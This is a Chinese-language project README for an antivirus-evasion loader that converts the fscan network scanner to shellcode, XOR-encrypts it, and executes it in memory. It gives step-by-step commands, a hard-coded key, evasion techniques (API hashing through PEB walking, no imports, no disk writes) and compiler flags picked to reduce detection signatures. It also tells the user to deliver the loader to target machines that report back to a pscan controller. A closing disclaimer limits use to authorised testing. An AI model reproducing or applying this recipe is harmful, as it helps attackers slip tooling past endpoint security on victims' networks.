# pscan-loader

fscan 免杀 shellcode 加载器 — 通过 API 哈希 + XOR 加密规避杀软检测，配合 [pscan](https://github.com/webzzaa/pscan) 使用。

## 工作原理

1. **fscan.exe → Shellcode**：使用 `pe2shc.exe` 将 文件转换为shellcode
2. **XOR 加密**：`xor.py` 对 shellcode 做单字节异或加密，生成 `output.bin`
3. **内存加载执行**：`loader.exe` 运行时动态解析 API，解密 shellcode 并在内存中直接执行

## 项目结构

```
pscan-loader-/
├── LICENSE
└── fscan_bypass/
    ├── fscan.exe                  # 目标程序（需自行准备）
    ├── loader.cpp                 # 加载器源码（API 哈希方案）
    ├── loader.exe                 # 编译好的加载器
    ├── output.bin                 # 加密后的 shellcode
    ├── xor/
    │   └── xor.py                 # XOR 加密脚本
    └── exe_to_shellcode/
        └── pe2shc.exe             # PE → Shellcode 转换工具
```

## 快速开始

### 环境要求

- Windows x64
- Python 3

### 第一步：生成加密 Shellcode

```powershell
# 将 fscan.exe 转换为原始 shellcode
.\fscan_bypass\exe_to_shellcode\pe2shc.exe .\fscan_bypass\fscan.exe .\fscan_bypass\fscan.bin

# XOR 加密（密钥 0xAA，与 loader 内置密钥一致）
python .\fscan_bypass\xor\xor.py .\fscan_bypass\fscan.bin .\fscan_bypass\output.bin 170
```

### 第二步：执行加载器

```powershell
cd fscan_bypass
.\loader.exe -h 127.0.0.1
```

> loader.exe 运行时会读取同目录下的 `output.bin`，解密后在内存中执行 fscan。
实现效果
> <img width="1381" height="630" alt="9fa1c076-756c-4545-b793-9aa5f6cb0a14" src="https://github.com/user-attachments/assets/c050c63b-b1f2-49be-a9fd-a3976cd3c69d" />


### 自定义编译加载器

使用 MSVC 2022 BuildTools x64 环境：

```cmd
cl.exe /MD /EHsc /Od /GS- /Fe:loader.exe loader.cpp
```

编译参数说明：

| 参数 | 作用 |
|------|------|
| `/MD` | 动态链接 CRT，减少静态特征 |
| `/EHsc` | 启用 C++ 异常处理（SEH） |
| `/Od` | 禁用优化，防止解密函数被优化掉 |
| `/GS-` | 禁用缓冲区安全检查，减少函数调用特征 |

> 如需修改 XOR 密钥，需同时修改 `loader.cpp` 中的 `xorKey` 常量（第 124 行）和 `xor.py` 的密钥参数。

## 免杀技术

- **API 哈希**：通过 PEB 遍历 + 导出表哈希匹配动态解析 API，消除导入表中的敏感函数字符串
- **XOR 加密**：Shellcode 文件级加密，静态扫描时无原始特征
- **内存执行**：不释放文件到磁盘，不调用 `CreateProcess`
- **SEH 异常保护**：Shellcode 崩溃时安全退出，不触发系统崩溃报告

## 配合 pscan 使用

本项目生成的是 fscan 的免杀加载器。完整的内网扫描方案请配合 [pscan](https://github.com/webzzaa/pscan) 控制端使用：

1. 使用 `pscan` 生成加密配置和控制端监听
2. 将生成的加密 shellcode（`output.bin`）和 `loader.exe` 投递到目标机器
3. 在目标机器执行 `loader.exe -h <pscan-server-ip>`
4. 在 pscan 控制端查看扫描结果

## 第三方组件

| 组件 | 来源 | 许可 |
|------|------|------|
| `pe2shc.exe` | [hasherezade/pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode) | BSD 2-Clause |

## 免责声明

本项目仅供安全研究和授权测试使用。使用者需遵守当地法律法规，对自身行为负责。

## License

MIT ©
